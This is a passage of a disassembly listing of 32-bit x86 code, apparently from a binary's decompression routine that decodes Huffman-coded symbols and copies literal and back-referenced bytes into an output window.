 10088fc:	5e                   	pop    %esi
 10088fd:	5d                   	pop    %ebp
 10088fe:	c2 0c 00             	ret    $0xc
 1008901:	cc                   	int3
 1008902:	cc                   	int3
 1008903:	cc                   	int3
 1008904:	cc                   	int3
 1008905:	cc                   	int3
 1008906:	8b ff                	mov    %edi,%edi
 1008908:	55                   	push   %ebp
 1008909:	8b ec                	mov    %esp,%ebp
 100890b:	83 ec 18             	sub    $0x18,%esp
 100890e:	8a 82 b4 2e 00 00    	mov    0x2eb4(%edx),%al
 1008914:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008917:	88 45 ff             	mov    %al,-0x1(%ebp)
 100891a:	8b 82 08 2b 00 00    	mov    0x2b08(%edx),%eax
 1008920:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1008923:	8b 02                	mov    (%edx),%eax
 1008925:	89 45 ec             	mov    %eax,-0x14(%ebp)
 1008928:	8b 45 0c             	mov    0xc(%ebp),%eax
 100892b:	53                   	push   %ebx
 100892c:	56                   	push   %esi
 100892d:	8b b2 b0 2e 00 00    	mov    0x2eb0(%edx),%esi
 1008933:	03 c1                	add    %ecx,%eax
 1008935:	3b c8                	cmp    %eax,%ecx
 1008937:	57                   	push   %edi
 1008938:	8b ba 04 2b 00 00    	mov    0x2b04(%edx),%edi
 100893e:	89 45 e8             	mov    %eax,-0x18(%ebp)
 1008941:	0f 8d 55 03 00 00    	jge    0x1008c9c
 1008947:	8b c6                	mov    %esi,%eax
 1008949:	c1 e8 16             	shr    $0x16,%eax
 100894c:	3d 00 04 00 00       	cmp    $0x400,%eax
 1008951:	73 0a                	jae    0x100895d
 1008953:	0f bf 5c 42 18       	movswl 0x18(%edx,%eax,2),%ebx
 1008958:	33 c0                	xor    %eax,%eax
 100895a:	40                   	inc    %eax
 100895b:	eb 0b                	jmp    0x1008968
 100895d:	33 c0                	xor    %eax,%eax
 100895f:	40                   	inc    %eax
 1008960:	89 82 bc 2e 00 00    	mov    %eax,0x2ebc(%edx)
 1008966:	33 db                	xor    %ebx,%ebx
 1008968:	85 db                	test   %ebx,%ebx
 100896a:	7d 48                	jge    0x10089b4
 100896c:	c7 45 0c 00 00 20 00 	movl   $0x200000,0xc(%ebp)
 1008973:	f7 db                	neg    %ebx
 1008975:	85 75 0c             	test   %esi,0xc(%ebp)
 1008978:	74 16                	je     0x1008990
 100897a:	8d 4c 1b 01          	lea    0x1(%ebx,%ebx,1),%ecx
 100897e:	81 f9 80 0a 00 00    	cmp    $0xa80,%ecx
 1008984:	73 1f                	jae    0x10089a5
 1008986:	0f bf 9c 9a 3e 0e 00 	movswl 0xe3e(%edx,%ebx,4),%ebx
 100898d:	00 
 100898e:	eb 1d                	jmp    0x10089ad
 1008990:	8d 0c 1b             	lea    (%ebx,%ebx,1),%ecx
 1008993:	81 f9 80 0a 00 00    	cmp    $0xa80,%ecx
 1008999:	73 0a                	jae    0x10089a5
 100899b:	0f bf 9c 9a 3c 0e 00 	movswl 0xe3c(%edx,%ebx,4),%ebx
 10089a2:	00 
 10089a3:	eb 08                	jmp    0x10089ad
 10089a5:	33 db                	xor    %ebx,%ebx
 10089a7:	89 82 bc 2e 00 00    	mov    %eax,0x2ebc(%edx)
 10089ad:	d1 6d 0c             	shrl   $1,0xc(%ebp)
 10089b0:	85 db                	test   %ebx,%ebx
 10089b2:	7c bf                	jl     0x1008973
 10089b4:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 10089bb:	0f 85 fa 02 00 00    	jne    0x1008cbb
 10089c1:	3b 7d f0             	cmp    -0x10(%ebp),%edi
 10089c4:	0f 83 f1 02 00 00    	jae    0x1008cbb
 10089ca:	8a 8c 13 18 0a 00 00 	mov    0xa18(%ebx,%edx,1),%cl
 10089d1:	d3 e6                	shl    %cl,%esi
 10089d3:	33 c9                	xor    %ecx,%ecx
 10089d5:	8a 4d ff             	mov    -0x1(%ebp),%cl
 10089d8:	2a 8c 13 18 0a 00 00 	sub    0xa18(%ebx,%edx,1),%cl
 10089df:	89 75 f8             	mov    %esi,-0x8(%ebp)
 10089e2:	84 c9                	test   %cl,%cl
 10089e4:	88 4d ff             	mov    %cl,-0x1(%ebp)
 10089e7:	7f 14                	jg     0x10089fd
 10089e9:	33 c0                	xor    %eax,%eax
 10089eb:	8a 67 01             	mov    0x1(%edi),%ah
 10089ee:	f7 d9                	neg    %ecx
 10089f0:	8a 07                	mov    (%edi),%al
 10089f2:	d3 e0                	shl    %cl,%eax
 10089f4:	09 45 f8             	or     %eax,-0x8(%ebp)
 10089f7:	47                   	inc    %edi
 10089f8:	47                   	inc    %edi
 10089f9:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 10089fd:	b9 00 01 00 00       	mov    $0x100,%ecx
 1008a02:	2b d9                	sub    %ecx,%ebx
 1008a04:	79 1a                	jns    0x1008a20
 1008a06:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008a09:	8b 45 ec             	mov    -0x14(%ebp),%eax
 1008a0c:	88 1c 08             	mov    %bl,(%eax,%ecx,1)
 1008a0f:	8b 72 04             	mov    0x4(%edx),%esi
 1008a12:	03 f0                	add    %eax,%esi
 1008a14:	88 1c 0e             	mov    %bl,(%esi,%ecx,1)
 1008a17:	41                   	inc    %ecx
 1008a18:	89 4d 08             	mov    %ecx,0x8(%ebp)
 1008a1b:	e9 70 02 00 00       	jmp    0x1008c90
 1008a20:	8b c3                	mov    %ebx,%eax
 1008a22:	83 e0 07             	and    $0x7,%eax
 1008a25:	83 f8 07             	cmp    $0x7,%eax
 1008a28:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1008a2b:	0f 85 ce 00 00 00    	jne    0x1008aff
 1008a31:	8b 45 f8             	mov    -0x8(%ebp),%eax
 1008a34:	c1 e8 18             	shr    $0x18,%eax
 1008a37:	3b c1                	cmp    %ecx,%eax
 1008a39:	73 0a                	jae    0x1008a45
 1008a3b:	0f bf 84 42 18 08 00 	movswl 0x818(%edx,%eax,2),%eax
 1008a42:	00 
 1008a43:	eb 0c                	jmp    0x1008a51
 1008a45:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1008a4c:	00 00 00 
 1008a4f:	33 c0                	xor    %eax,%eax
 1008a51:	85 c0                	test   %eax,%eax
 1008a53:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1008a56:	7d 4e                	jge    0x1008aa6
 1008a58:	b9 00 00 80 00       	mov    $0x800000,%ecx
 1008a5d:	8b 75 f8             	mov    -0x8(%ebp),%esi
 1008a60:	f7 d8                	neg    %eax
 1008a62:	85 ce                	test   %ecx,%esi
 1008a64:	74 16                	je     0x1008a7c
 1008a66:	8d 74 00 01          	lea    0x1(%eax,%eax,1),%esi
 1008a6a:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008a70:	73 1f                	jae    0x1008a91
 1008a72:	0f bf 84 82 3e 23 00 	movswl 0x233e(%edx,%eax,4),%eax
 1008a79:	00 
 1008a7a:	eb 21                	jmp    0x1008a9d
 1008a7c:	8d 34 00             	lea    (%eax,%eax,1),%esi
 1008a7f:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008a85:	73 0a                	jae    0x1008a91
 1008a87:	0f bf 84 82 3c 23 00 	movswl 0x233c(%edx,%eax,4),%eax
 1008a8e:	00 
 1008a8f:	eb 0c                	jmp    0x1008a9d
 1008a91:	33 c0                	xor    %eax,%eax
 1008a93:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1008a9a:	00 00 00 
 1008a9d:	d1 e9                	shr    $1,%ecx
 1008a9f:	85 c0                	test   %eax,%eax
 1008aa1:	7c ba                	jl     0x1008a5d
 1008aa3:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1008aa6:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008aad:	75 3d                	jne    0x1008aec
 1008aaf:	3b 7d f0             	cmp    -0x10(%ebp),%edi
 1008ab2:	0f 83 03 02 00 00    	jae    0x1008cbb
 1008ab8:	8a 8c 10 b8 0c 00 00 	mov    0xcb8(%eax,%edx,1),%cl
 1008abf:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008ac2:	33 c9                	xor    %ecx,%ecx
 1008ac4:	8a 4d ff             	mov    -0x1(%ebp),%cl
 1008ac7:	2a 8c 10 b8 0c 00 00 	sub    0xcb8(%eax,%edx,1),%cl
 1008ace:	84 c9                	test   %cl,%cl
 1008ad0:	88 4d ff             	mov    %cl,-0x1(%ebp)
 1008ad3:	7f 14                	jg     0x1008ae9
 1008ad5:	33 c0                	xor    %eax,%eax
 1008ad7:	8a 67 01             	mov    0x1(%edi),%ah
 1008ada:	f7 d9                	neg    %ecx
 1008adc:	8a 07                	mov    (%edi),%al
 1008ade:	d3 e0                	shl    %cl,%eax
 1008ae0:	09 45 f8             	or     %eax,-0x8(%ebp)
 1008ae3:	47                   	inc    %edi
 1008ae4:	47                   	inc    %edi
 1008ae5:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 1008ae9:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1008aec:	83 c0 07             	add    $0x7,%eax
 1008aef:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008af6:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1008af9:	0f 85 bc 01 00 00    	jne    0x1008cbb
 1008aff:	c1 fb 03             	sar    $0x3,%ebx
 1008b02:	80 fb 02             	cmp    $0x2,%bl
 1008b05:	0f 8e 36 01 00 00    	jle    0x1008c41
 1008b0b:	0f be db             	movsbl %bl,%ebx
 1008b0e:	8a 8b f0 25 00 01    	mov    0x10025f0(%ebx),%cl
 1008b14:	80 f9 03             	cmp    $0x3,%cl
 1008b17:	88 4d 0f             	mov    %cl,0xf(%ebp)
 1008b1a:	0f 82 bf 00 00 00    	jb     0x1008bdf
 1008b20:	0f b6 f1             	movzbl %cl,%esi
 1008b23:	8d 4e fd             	lea    -0x3(%esi),%ecx
 1008b26:	85 c9                	test   %ecx,%ecx
 1008b28:	0f 84 ad 00 00 00    	je     0x1008bdb
 1008b2e:	6a 23                	push   $0x23
 1008b30:	59                   	pop    %ecx
 1008b31:	2b ce                	sub    %esi,%ecx
 1008b33:	8b 75 f8             	mov    -0x8(%ebp),%esi
 1008b36:	d3 ee                	shr    %cl,%esi
 1008b38:	3b 7d f0             	cmp    -0x10(%ebp),%edi
 1008b3b:	0f 83 7a 01 00 00    	jae    0x1008cbb
 1008b41:	33 c9                	xor    %ecx,%ecx
 1008b43:	8a 8b f0 25 00 01    	mov    0x10025f0(%ebx),%cl
 1008b49:	b0 03                	mov    $0x3,%al
 1008b4b:	2a 83 f0 25 00 01    	sub    0x10025f0(%ebx),%al
 1008b51:	00 45 ff             	add    %al,-0x1(%ebp)
 1008b54:	83 e9 03             	sub    $0x3,%ecx
 1008b57:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008b5a:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 1008b5e:	7f 19                	jg     0x1008b79
 1008b60:	33 c0                	xor    %eax,%eax
 1008b62:	8a 67 01             	mov    0x1(%edi),%ah
 1008b65:	33 c9                	xor    %ecx,%ecx
 1008b67:	8a 4d ff             	mov    -0x1(%ebp),%cl
 1008b6a:	8a 07                	mov    (%edi),%al
 1008b6c:	f7 d9                	neg    %ecx
 1008b6e:	d3 e0                	shl    %cl,%eax
 1008b70:	09 45 f8             	or     %eax,-0x8(%ebp)
 1008b73:	47                   	inc    %edi
 1008b74:	47                   	inc    %edi
 1008b75:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 1008b79:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1008b7c:	8b 0c 9d 28 26 00 01 	mov    0x1002628(,%ebx,4),%ecx
 1008b83:	8d 34 f1             	lea    (%ecx,%esi,8),%esi
 1008b86:	8b 4d f8             	mov    -0x8(%ebp),%ecx
 1008b89:	c1 e9 19             	shr    $0x19,%ecx
 1008b8c:	3b 7d f0             	cmp    -0x10(%ebp),%edi
 1008b8f:	0f be 8c 11 b4 0d 00 	movsbl 0xdb4(%ecx,%edx,1),%ecx
 1008b96:	00 
 1008b97:	89 4d 0c             	mov    %ecx,0xc(%ebp)
 1008b9a:	0f 83 1b 01 00 00    	jae    0x1008cbb
 1008ba0:	8a 8c 11 34 0e 00 00 	mov    0xe34(%ecx,%edx,1),%cl
 1008ba7:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008baa:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1008bad:	8a 8c 11 34 0e 00 00 	mov    0xe34(%ecx,%edx,1),%cl
 1008bb4:	28 4d ff             	sub    %cl,-0x1(%ebp)
 1008bb7:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 1008bbb:	7f 19                	jg     0x1008bd6
 1008bbd:	33 db                	xor    %ebx,%ebx
 1008bbf:	8a 7f 01             	mov    0x1(%edi),%bh
 1008bc2:	33 c9                	xor    %ecx,%ecx
 1008bc4:	8a 4d ff             	mov    -0x1(%ebp),%cl
 1008bc7:	8a 1f                	mov    (%edi),%bl
 1008bc9:	f7 d9                	neg    %ecx
 1008bcb:	d3 e3                	shl    %cl,%ebx
 1008bcd:	09 5d f8             	or     %ebx,-0x8(%ebp)
 1008bd0:	47                   	inc    %edi
 1008bd1:	47                   	inc    %edi
 1008bd2:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 1008bd6:	03 75 0c             	add    0xc(%ebp),%esi
 1008bd9:	eb 58                	jmp    0x1008c33
 1008bdb:	33 f6                	xor    %esi,%esi
 1008bdd:	eb 9d                	jmp    0x1008b7c
 1008bdf:	84 c9                	test   %cl,%cl
 1008be1:	74 4d                	je     0x1008c30
 1008be3:	8b 75 f8             	mov    -0x8(%ebp),%esi
 1008be6:	6a 20                	push   $0x20
 1008be8:	59                   	pop    %ecx
 1008be9:	2b 4d 0f             	sub    0xf(%ebp),%ecx
 1008bec:	d3 ee                	shr    %cl,%esi
 1008bee:	3b 7d f0             	cmp    -0x10(%ebp),%edi
 1008bf1:	0f 83 c4 00 00 00    	jae    0x1008cbb
 1008bf7:	8a 8b f0 25 00 01    	mov    0x10025f0(%ebx),%cl
 1008bfd:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008c00:	8a c1                	mov    %cl,%al
 1008c02:	28 45 ff             	sub    %al,-0x1(%ebp)
 1008c05:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 1008c09:	7f 19                	jg     0x1008c24
 1008c0b:	33 c0                	xor    %eax,%eax
 1008c0d:	8a 67 01             	mov    0x1(%edi),%ah
 1008c10:	33 c9                	xor    %ecx,%ecx
 1008c12:	8a 4d ff             	mov    -0x1(%ebp),%cl
 1008c15:	8a 07                	mov    (%edi),%al
 1008c17:	f7 d9                	neg    %ecx
 1008c19:	d3 e0                	shl    %cl,%eax
 1008c1b:	09 45 f8             	or     %eax,-0x8(%ebp)
 1008c1e:	47                   	inc    %edi
 1008c1f:	47                   	inc    %edi
 1008c20:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 1008c24:	03 34 9d 28 26 00 01 	add    0x1002628(,%ebx,4),%esi
 1008c2b:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1008c2e:	eb 03                	jmp    0x1008c33
 1008c30:	33 f6                	xor    %esi,%esi
 1008c32:	46                   	inc    %esi
 1008c33:	8b 4a 10             	mov    0x10(%edx),%ecx
 1008c36:	89 4a 14             	mov    %ecx,0x14(%edx)
 1008c39:	8b 4a 0c             	mov    0xc(%edx),%ecx
 1008c3c:	89 4a 10             	mov    %ecx,0x10(%edx)
 1008c3f:	eb 12                	jmp    0x1008c53
 1008c41:	84 db                	test   %bl,%bl
 1008c43:	0f be cb             	movsbl %bl,%ecx
 1008c46:	8d 4c 8a 0c          	lea    0xc(%edx,%ecx,4),%ecx
 1008c4a:	8b 31                	mov    (%ecx),%esi
 1008c4c:	74 08                	je     0x1008c56
 1008c4e:	8b 5a 0c             	mov    0xc(%edx),%ebx
 1008c51:	89 19                	mov    %ebx,(%ecx)
 1008c53:	89 72 0c             	mov    %esi,0xc(%edx)
 1008c56:	8b 5d 08             	mov    0x8(%ebp),%ebx
 1008c59:	40                   	inc    %eax
 1008c5a:	8b cb                	mov    %ebx,%ecx
 1008c5c:	40                   	inc    %eax
 1008c5d:	2b ce                	sub    %esi,%ecx
 1008c5f:	89 4d 08             	mov    %ecx,0x8(%ebp)
 1008c62:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008c65:	23 4a 08             	and    0x8(%edx),%ecx
 1008c68:	81 fb 01 01 00 00    	cmp    $0x101,%ebx
 1008c6e:	8b 75 ec             	mov    -0x14(%ebp),%esi
 1008c71:	8a 0c 31             	mov    (%ecx,%esi,1),%cl
 1008c74:	88 0c 1e             	mov    %cl,(%esi,%ebx,1)
 1008c77:	7d 09                	jge    0x1008c82
 1008c79:	8b 72 04             	mov    0x4(%edx),%esi
 1008c7c:	03 75 ec             	add    -0x14(%ebp),%esi
 1008c7f:	88 0c 1e             	mov    %cl,(%esi,%ebx,1)
 1008c82:	43                   	inc    %ebx
 1008c83:	ff 45 08             	incl   0x8(%ebp)
 1008c86:	48                   	dec    %eax
 1008c87:	85 c0                	test   %eax,%eax
 1008c89:	7f d7                	jg     0x1008c62
 1008c8b:	89 5d 08             	mov    %ebx,0x8(%ebp)
 1008c8e:	8b cb                	mov    %ebx,%ecx
 1008c90:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
 1008c93:	8b 75 f8             	mov    -0x8(%ebp),%esi
 1008c96:	0f 8c ab fc ff ff    	jl     0x1008947
 1008c9c:	8a 45 ff             	mov    -0x1(%ebp),%al
 1008c9f:	88 82 b4 2e 00 00    	mov    %al,0x2eb4(%edx)
 1008ca5:	8b 45 08             	mov    0x8(%ebp),%eax
 1008ca8:	89 b2 b0 2e 00 00    	mov    %esi,0x2eb0(%edx)
 1008cae:	89 ba 04 2b 00 00    	mov    %edi,0x2b04(%edx)
 1008cb4:	5f                   	pop    %edi
 1008cb5:	5e                   	pop    %esi
 1008cb6:	5b                   	pop    %ebx
 1008cb7:	c9                   	leave
 1008cb8:	c2 08 00             	ret    $0x8
 1008cbb:	83 c8 ff             	or     $0xffffffff,%eax
 1008cbe:	eb f4                	jmp    0x1008cb4
 1008cc0:	cc                   	int3
 1008cc1:	cc                   	int3
 1008cc2:	cc                   	int3
 1008cc3:	cc                   	int3
 1008cc4:	cc                   	int3
 1008cc5:	8b ff                	mov    %edi,%edi
 1008cc7:	55                   	push   %ebp
 1008cc8:	8b ec                	mov    %esp,%ebp
 1008cca:	83 ec 14             	sub    $0x14,%esp
 1008ccd:	8b 55 08             	mov    0x8(%ebp),%edx
 1008cd0:	8a 82 b4 2e 00 00    	mov    0x2eb4(%edx),%al
 1008cd6:	8b 4d 10             	mov    0x10(%ebp),%ecx
 1008cd9:	88 45 0b             	mov    %al,0xb(%ebp)
 1008cdc:	8b 82 b0 2e 00 00    	mov    0x2eb0(%edx),%eax
 1008ce2:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1008ce5:	8b 82 08 2b 00 00    	mov    0x2b08(%edx),%eax
 1008ceb:	89 45 f8             	mov    %eax,-0x8(%ebp)
 1008cee:	8b 02                	mov    (%edx),%eax
 1008cf0:	53                   	push   %ebx
 1008cf1:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1008cf4:	8b 45 0c             	mov    0xc(%ebp),%eax
 1008cf7:	03 c8                	add    %eax,%ecx
 1008cf9:	3b c1                	cmp    %ecx,%eax
 1008cfb:	56                   	push   %esi
 1008cfc:	57                   	push   %edi
 1008cfd:	8b ba 04 2b 00 00    	mov    0x2b04(%edx),%edi
 1008d03:	89 4d ec             	mov    %ecx,-0x14(%ebp)
 1008d06:	0f 8d 21 03 00 00    	jge    0x100902d
 1008d0c:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1008d0f:	33 c9                	xor    %ecx,%ecx
 1008d11:	c1 e8 16             	shr    $0x16,%eax
 1008d14:	41                   	inc    %ecx
 1008d15:	3d 00 04 00 00       	cmp    $0x400,%eax
 1008d1a:	73 07                	jae    0x1008d23
 1008d1c:	0f bf 44 42 18       	movswl 0x18(%edx,%eax,2),%eax
 1008d21:	eb 08                	jmp    0x1008d2b
 1008d23:	89 8a bc 2e 00 00    	mov    %ecx,0x2ebc(%edx)
 1008d29:	33 c0                	xor    %eax,%eax
 1008d2b:	85 c0                	test   %eax,%eax
 1008d2d:	7d 47                	jge    0x1008d76
 1008d2f:	be 00 00 20 00       	mov    $0x200000,%esi
 1008d34:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 1008d37:	f7 d8                	neg    %eax
 1008d39:	85 f3                	test   %esi,%ebx
 1008d3b:	74 16                	je     0x1008d53
 1008d3d:	8d 5c 00 01          	lea    0x1(%eax,%eax,1),%ebx
 1008d41:	81 fb 80 0a 00 00    	cmp    $0xa80,%ebx
 1008d47:	73 1f                	jae    0x1008d68
 1008d49:	0f bf 84 82 3e 0e 00 	movswl 0xe3e(%edx,%eax,4),%eax
 1008d50:	00 
 1008d51:	eb 1d                	jmp    0x1008d70
 1008d53:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
 1008d56:	81 fb 80 0a 00 00    	cmp    $0xa80,%ebx
 1008d5c:	73 0a                	jae    0x1008d68
 1008d5e:	0f bf 84 82 3c 0e 00 	movswl 0xe3c(%edx,%eax,4),%eax
 1008d65:	00 
 1008d66:	eb 08                	jmp    0x1008d70
 1008d68:	33 c0                	xor    %eax,%eax
 1008d6a:	89 8a bc 2e 00 00    	mov    %ecx,0x2ebc(%edx)
 1008d70:	d1 ee                	shr    $1,%esi
 1008d72:	85 c0                	test   %eax,%eax
 1008d74:	7c be                	jl     0x1008d34
 1008d76:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008d7d:	75 35                	jne    0x1008db4
 1008d7f:	3b 7d f8             	cmp    -0x8(%ebp),%edi
 1008d82:	0f 83 d2 02 00 00    	jae    0x100905a
 1008d88:	8a 8c 10 18 0a 00 00 	mov    0xa18(%eax,%edx,1),%cl
 1008d8f:	28 4d 0b             	sub    %cl,0xb(%ebp)
 1008d92:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008d95:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 1008d99:	7f 19                	jg     0x1008db4
 1008d9b:	33 db                	xor    %ebx,%ebx
 1008d9d:	8a 7f 01             	mov    0x1(%edi),%bh
 1008da0:	33 c9                	xor    %ecx,%ecx
 1008da2:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008da5:	8a 1f                	mov    (%edi),%bl
 1008da7:	f7 d9                	neg    %ecx
 1008da9:	d3 e3                	shl    %cl,%ebx
 1008dab:	09 5d fc             	or     %ebx,-0x4(%ebp)
 1008dae:	47                   	inc    %edi
 1008daf:	47                   	inc    %edi
 1008db0:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008db4:	be 00 01 00 00       	mov    $0x100,%esi
 1008db9:	2b c6                	sub    %esi,%eax
 1008dbb:	89 45 10             	mov    %eax,0x10(%ebp)
 1008dbe:	79 11                	jns    0x1008dd1
 1008dc0:	8b 75 0c             	mov    0xc(%ebp),%esi
 1008dc3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 1008dc6:	ff 45 0c             	incl   0xc(%ebp)
 1008dc9:	88 04 31             	mov    %al,(%ecx,%esi,1)
 1008dcc:	e9 50 02 00 00       	jmp    0x1009021
 1008dd1:	8b d8                	mov    %eax,%ebx
 1008dd3:	83 e3 07             	and    $0x7,%ebx
 1008dd6:	83 fb 07             	cmp    $0x7,%ebx
 1008dd9:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 1008ddc:	0f 85 c1 00 00 00    	jne    0x1008ea3
 1008de2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1008de5:	c1 e9 18             	shr    $0x18,%ecx
 1008de8:	3b ce                	cmp    %esi,%ecx
 1008dea:	73 0a                	jae    0x1008df6
 1008dec:	0f bf 9c 4a 18 08 00 	movswl 0x818(%edx,%ecx,2),%ebx
 1008df3:	00 
 1008df4:	eb 0c                	jmp    0x1008e02
 1008df6:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1008dfd:	00 00 00 
 1008e00:	33 db                	xor    %ebx,%ebx
 1008e02:	85 db                	test   %ebx,%ebx
 1008e04:	7d 4b                	jge    0x1008e51
 1008e06:	b9 00 00 80 00       	mov    $0x800000,%ecx
 1008e0b:	8b 75 fc             	mov    -0x4(%ebp),%esi
 1008e0e:	f7 db                	neg    %ebx
 1008e10:	85 ce                	test   %ecx,%esi
 1008e12:	74 16                	je     0x1008e2a
 1008e14:	8d 74 1b 01          	lea    0x1(%ebx,%ebx,1),%esi
 1008e18:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008e1e:	73 1f                	jae    0x1008e3f
 1008e20:	0f bf 9c 9a 3e 23 00 	movswl 0x233e(%edx,%ebx,4),%ebx
 1008e27:	00 
 1008e28:	eb 21                	jmp    0x1008e4b
 1008e2a:	8d 34 1b             	lea    (%ebx,%ebx,1),%esi
 1008e2d:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008e33:	73 0a                	jae    0x1008e3f
 1008e35:	0f bf 9c 9a 3c 23 00 	movswl 0x233c(%edx,%ebx,4),%ebx
 1008e3c:	00 
 1008e3d:	eb 0c                	jmp    0x1008e4b
 1008e3f:	33 db                	xor    %ebx,%ebx
 1008e41:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1008e48:	00 00 00 
 1008e4b:	d1 e9                	shr    $1,%ecx
 1008e4d:	85 db                	test   %ebx,%ebx
 1008e4f:	7c ba                	jl     0x1008e0b
 1008e51:	8b b2 bc 2e 00 00    	mov    0x2ebc(%edx),%esi
 1008e57:	85 f6                	test   %esi,%esi
 1008e59:	75 3a                	jne    0x1008e95
 1008e5b:	3b 7d f8             	cmp    -0x8(%ebp),%edi
 1008e5e:	0f 83 f6 01 00 00    	jae    0x100905a
 1008e64:	8a 8c 13 b8 0c 00 00 	mov    0xcb8(%ebx,%edx,1),%cl
 1008e6b:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008e6e:	8a c1                	mov    %cl,%al
 1008e70:	28 45 0b             	sub    %al,0xb(%ebp)
 1008e73:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 1008e77:	7f 19                	jg     0x1008e92
 1008e79:	33 c0                	xor    %eax,%eax
 1008e7b:	8a 67 01             	mov    0x1(%edi),%ah
 1008e7e:	33 c9                	xor    %ecx,%ecx
 1008e80:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008e83:	8a 07                	mov    (%edi),%al
 1008e85:	f7 d9                	neg    %ecx
 1008e87:	d3 e0                	shl    %cl,%eax
 1008e89:	09 45 fc             	or     %eax,-0x4(%ebp)
 1008e8c:	47                   	inc    %edi
 1008e8d:	47                   	inc    %edi
 1008e8e:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008e92:	8b 45 10             	mov    0x10(%ebp),%eax
 1008e95:	83 c3 07             	add    $0x7,%ebx
 1008e98:	85 f6                	test   %esi,%esi
 1008e9a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 1008e9d:	0f 85 b7 01 00 00    	jne    0x100905a
 1008ea3:	c1 f8 03             	sar    $0x3,%eax
 1008ea6:	3c 02                	cmp    $0x2,%al
 1008ea8:	0f 8e 35 01 00 00    	jle    0x1008fe3
 1008eae:	0f be c0             	movsbl %al,%eax
 1008eb1:	8a 88 f0 25 00 01    	mov    0x10025f0(%eax),%cl
 1008eb7:	80 f9 03             	cmp    $0x3,%cl
 1008eba:	88 4d 13             	mov    %cl,0x13(%ebp)
 1008ebd:	0f 82 bc 00 00 00    	jb     0x1008f7f
 1008ec3:	0f b6 f1             	movzbl %cl,%esi
 1008ec6:	8d 4e fd             	lea    -0x3(%esi),%ecx
 1008ec9:	85 c9                	test   %ecx,%ecx
 1008ecb:	0f 84 aa 00 00 00    	je     0x1008f7b
 1008ed1:	6a 23                	push   $0x23
 1008ed3:	59                   	pop    %ecx
 1008ed4:	2b ce                	sub    %esi,%ecx
 1008ed6:	8b 75 fc             	mov    -0x4(%ebp),%esi
 1008ed9:	d3 ee                	shr    %cl,%esi
 1008edb:	3b 7d f8             	cmp    -0x8(%ebp),%edi
 1008ede:	0f 83 76 01 00 00    	jae    0x100905a
 1008ee4:	33 c9                	xor    %ecx,%ecx
 1008ee6:	8a 88 f0 25 00 01    	mov    0x10025f0(%eax),%cl
 1008eec:	83 e9 03             	sub    $0x3,%ecx
 1008eef:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008ef2:	b1 03                	mov    $0x3,%cl
 1008ef4:	2a 88 f0 25 00 01    	sub    0x10025f0(%eax),%cl
 1008efa:	00 4d 0b             	add    %cl,0xb(%ebp)
 1008efd:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 1008f01:	7f 19                	jg     0x1008f1c
 1008f03:	33 db                	xor    %ebx,%ebx
 1008f05:	8a 7f 01             	mov    0x1(%edi),%bh
 1008f08:	33 c9                	xor    %ecx,%ecx
 1008f0a:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008f0d:	8a 1f                	mov    (%edi),%bl
 1008f0f:	f7 d9                	neg    %ecx
 1008f11:	d3 e3                	shl    %cl,%ebx
 1008f13:	09 5d fc             	or     %ebx,-0x4(%ebp)
 1008f16:	47                   	inc    %edi
 1008f17:	47                   	inc    %edi
 1008f18:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
